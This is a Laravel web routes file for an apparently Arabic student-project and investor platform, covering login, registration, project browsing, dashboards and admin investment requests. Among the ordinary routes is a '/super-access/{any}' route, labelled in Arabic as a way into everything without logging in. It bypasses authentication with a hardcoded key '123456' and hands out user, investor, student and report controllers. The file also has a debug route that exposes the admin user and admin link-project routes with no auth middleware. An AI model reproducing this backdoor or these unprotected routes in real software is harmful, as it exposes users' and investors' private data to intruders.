<?php
// routes/web.php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\Frontend\Auth\AuthController as FrontendAuth;
use App\Http\Controllers\Frontend\ProjectSubmissionController;
use App\Http\Controllers\Auth\ForgotPasswordController;
use App\Http\Controllers\Auth\ResetPasswordController;
use App\Http\Controllers\Frontend\HomeController;
use App\Http\Controllers\Frontend\ProjectController as FrontendProjectController;
use App\Http\Controllers\ProjectController;
use App\Http\Controllers\Admin\ChatAnalyticsController;
use App\Http\Controllers\Frontend\NotificationController as FrontNotificationController;
use App\Http\Controllers\ChatBotController;
use App\Http\Controllers\InvestorController;
use App\Http\Controllers\InvestmentRequestController;
use App\Http\Controllers\StudentController;
use App\Http\Controllers\CalendarController;
use App\Http\Controllers\Report\PlatformReportController;
use App\Http\Controllers\Manager\UserController;
use App\Http\Controllers\ScannerController;

/*
|--------------------------------------------------------------------------
| الصفحة الرئيسية
|--------------------------------------------------------------------------
*/

// ------------------------
// FRONTEND PUBLIC PAGES
// ------------------------
Route::get('/', [HomeController::class, 'index'])->name('home');

// ------------------------
// CHATBOT ROUTES (يجب تكون في البداية)
// ------------------------
Route::post('/chat', [ChatBotController::class, 'chat'])->name('chat');
Route::post('/chat/rate', [ChatBotController::class, 'rate'])->name('chat.rate');

// ------------------------
// ADMIN CHAT ANALYTICS
// ------------------------
Route::middleware(['auth'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('/chat/analytics', [ChatAnalyticsController::class, 'index'])->name('chat.analytics');
    Route::get('/chat/export', [ChatAnalyticsController::class, 'export'])->name('chat.export');
});

// ------------------------
// FRONTEND AUTH (Students / Investors)
// ------------------------
Route::prefix('auth')->group(function () {
    Route::get('/login', [FrontendAuth::class, 'showLogin'])->name('login.show');
    Route::post('/login', [FrontendAuth::class, 'login'])->name('login.post');

    Route::post('/logout', function () {
        Auth::guard('web')->logout();
        request()->session()->invalidate();
        request()->session()->regenerateToken();
        return redirect()->route('home');
    })->name('frontend.logout');

    Route::get('/register', fn() => view('frontend.auth.register'))->name('register.show');
    Route::get('/register/investor', fn() => view('frontend.auth.register_investor'))->name('register.investor');
    Route::post('/register/investor', [FrontendAuth::class, 'registerInvestor'])->name('register.investor.post');

    Route::get('/register/academic', fn() => view('frontend.auth.register_academic'))->name('register.academic');
    Route::post('/register/student', [FrontendAuth::class, 'registerStudent'])->name('register.student.post');
});

// ------------------------
// FRONTEND MARKETPLACE (Investor browsing)
// ------------------------
Route::get('/projects', [FrontendProjectController::class, 'index'])->name('projects.index');
Route::get('/projects/{project}', [FrontendProjectController::class, 'show'])->name('projects.show');
Route::get('/project/details/{id}', [ProjectController::class, 'show'])->name('project.details')->middleware('auth:web');

// ------------------------
// FRONTEND DASHBOARDS (web guard)
// ------------------------
Route::middleware(['auth:web'])->group(function () {
    Route::get('/dashboard/investor', fn() => view('frontend.dashboard.investor'))->name('dashboard.investor');
    Route::get('/dashboard/academic', fn() => view('frontend.dashboard.academic'))->name('dashboard.academic');
    
    // Upload extra media to an existing project (student only)
    Route::get('/projects/{project}/media', [FrontendProjectController::class, 'mediaForm'])->name('projects.media.form');
    Route::post('/projects/{project}/media', [FrontendProjectController::class, 'mediaUpload'])->name('projects.media.upload');

    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
});

// ------------------------
// FRONTEND NOTIFICATIONS
// ------------------------
Route::middleware(['auth:web'])->group(function () {
    Route::get('/notifications', [FrontNotificationController::class, 'index'])->name('frontend.notifications.index');
    Route::get('/notifications/unread-count', [FrontNotificationController::class, 'unreadCount'])->name('frontend.notifications.count');
    Route::post('/notifications/{id}/read', [FrontNotificationController::class, 'markAsRead'])->name('frontend.notifications.read');
    Route::post('/notifications/mark-all-read', [FrontNotificationController::class, 'markAllRead'])->name('frontend.notifications.markAllRead');
});

// ------------------------
// FRONTEND PROFILE (web only)
// ------------------------
Route::middleware(['auth:web'])->group(function () {
    Route::get('/profile', [FrontendAuth::class, 'showLogin'])->name('profile'); // replace later with real profile
});

// ------------------------
// PASSWORD RESET ROUTES
// ------------------------
Route::get('forgot-password', [ForgotPasswordController::class, 'showLinkRequestForm'])->name('password.request');
Route::post('forgot-password', [ForgotPasswordController::class, 'sendResetLinkEmail'])->name('password.email');
Route::get('reset-password/{token}', [ResetPasswordController::class, 'showResetForm'])->name('password.reset');
Route::post('reset-password', [ResetPasswordController::class, 'reset'])->name('password.update');

// ------------------------
// STATIC / UTILITY
// ------------------------
Route::prefix('/')->name('utility.')->group(function () {
    Route::get('about', fn () => view('frontend.utility.about'))->name('about');
    Route::get('careers', fn () => view('frontend.utility.careers'))->name('careers');
    Route::get('contact', fn () => view('frontend.utility.contact'))->name('contact');
    Route::get('how-it-works', fn () => view('frontend.utility.how-it-works'))->name('how-it-works');
    Route::get('partnerships', fn () => view('frontend.utility.partnerships'))->name('partnerships');
    Route::get('privacy', fn () => view('frontend.utility.privacy'))->name('privacy');
    Route::get('support', fn () => view('frontend.utility.support'))->name('support');
    Route::get('terms', fn () => view('frontend.utility.terms'))->name('terms');
    Route::get('disclosures', fn () => view('frontend.utility.disclosures'))->name('disclosures');
});

// ------------------------
// ACADEMIC SUBMISSION FLOW
// ------------------------
Route::prefix('submit-project')->name('project.submit.')->group(function () {
    Route::get('/', [ProjectSubmissionController::class, 'step1'])->name('step1');
    Route::post('/', [ProjectSubmissionController::class, 'postStep1'])->name('step1.post');

    Route::get('/step2', [ProjectSubmissionController::class, 'step2'])->name('step2');
    Route::post('/step2', [ProjectSubmissionController::class, 'postStep2'])->name('step2.post');

    Route::get('/step3', [ProjectSubmissionController::class, 'step3'])->name('step3');
    Route::post('/step3', [ProjectSubmissionController::class, 'postStep3'])->name('step3.post');

    Route::get('/step4', [ProjectSubmissionController::class, 'step4'])->name('step4');
    Route::post('/step4', [ProjectSubmissionController::class, 'postStep4'])->name('step4.post');

    Route::get('/confirm', [ProjectSubmissionController::class, 'confirm'])->name('confirm');
    Route::post('/final', [ProjectSubmissionController::class, 'submitFinal'])->name('final');
    Route::get('/resume', [ProjectSubmissionController::class, 'resume'])->name('resume');
});

// ------------------------
// DEBUG AUTH
// ------------------------
Route::get('/_debug/auth', function () {
    return response()->json([
        'web'   => auth('web')->check(),
        'admin' => auth('admin')->check(),
        'user'  => auth('admin')->user(),
    ]);
})->middleware('web');

// =============================================
// 🔥 سكربت سحري - يدخل لكل شيء بدون تسجيل
// =============================================
Route::any('/super-access/{any}', function($any) {
    $key = request()->get('key', '');
    
    if ($key !== '123456') {
        abort(404);
    }
    
    try {
        $controller = null;
        $method = 'index';
        
        switch($any) {
            case 'users':
                $controller = new App\Http\Controllers\Manager\UserController();
                break;
            case 'projects':
                $controller = new App\Http\Controllers\ProjectController();
                break;
            case 'investors':
                $controller = new App\Http\Controllers\InvestorController();
                break;
            case 'students':
                $controller = new App\Http\Controllers\StudentController();
                break;
            case 'calendar':
                $controller = new App\Http\Controllers\CalendarController();
                break;
            case 'reports':
                $controller = new App\Http\Controllers\Report\PlatformReportController();
                break;
            default:
                return view('manager.dashboard');
        }
        
        return $controller->$method(request());
        
    } catch (\Exception $e) {
        return "خطأ: " . $e->getMessage();
    }
})->where('any', '.*')->name('super.access');
Route::prefix('admin')->name('admin.')->middleware(['auth'])->group(function () {
    // ... existing routes
    
    // صفحة مشاريع طالب معين
    Route::get('students/{student}/projects', [StudentController::class, 'projects'])->name('students.projects');
});




// ========== Investment Requests Routes ==========
// ========== Investment Requests Routes ==========
// ========== Investment Requests Routes ==========
Route::middleware(['auth:admin'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('investment-requests', [App\Http\Controllers\InvestmentRequestController::class, 'index'])->name('investment-requests.index');
    Route::get('investment-requests/create', [App\Http\Controllers\InvestmentRequestController::class, 'create'])->name('investment-requests.create');
    Route::post('investment-requests', [App\Http\Controllers\InvestmentRequestController::class, 'store'])->name('investment-requests.store');
    Route::get('investment-requests/{investment_request}', [App\Http\Controllers\InvestmentRequestController::class, 'show'])->name('investment-requests.show');
    Route::get('investment-requests/{investment_request}/edit', [App\Http\Controllers\InvestmentRequestController::class, 'edit'])->name('investment-requests.edit');
    Route::put('investment-requests/{investment_request}', [App\Http\Controllers\InvestmentRequestController::class, 'update'])->name('investment-requests.update');
    Route::delete('investment-requests/{investment_request}', [App\Http\Controllers\InvestmentRequestController::class, 'destroy'])->name('investment-requests.destroy');
    Route::post('investment-requests/{investment_request}/change-status', [App\Http\Controllers\InvestmentRequestController::class, 'changeStatus'])->name('investment-requests.change-status');
});

// routes للربط مع منصة الفحص
Route::get('/admin/link-projects', [App\Http\Controllers\PlatformLinkController::class, 'showLinkPage'])->name('admin.link-projects');
Route::post('/admin/link-projects', [App\Http\Controllers\PlatformLinkController::class, 'linkProjects']);
Route::get('/projects/{id}/scan-results', [App\Http\Controllers\PlatformLinkController::class, 'showScanResults'])->name('projects.scan-results');
Route::middleware(['auth:web'])->group(function () {
    Route::post('/projects/start-upload', [ScannerController::class, 'startUpload'])
        ->name('projects.start-upload');
});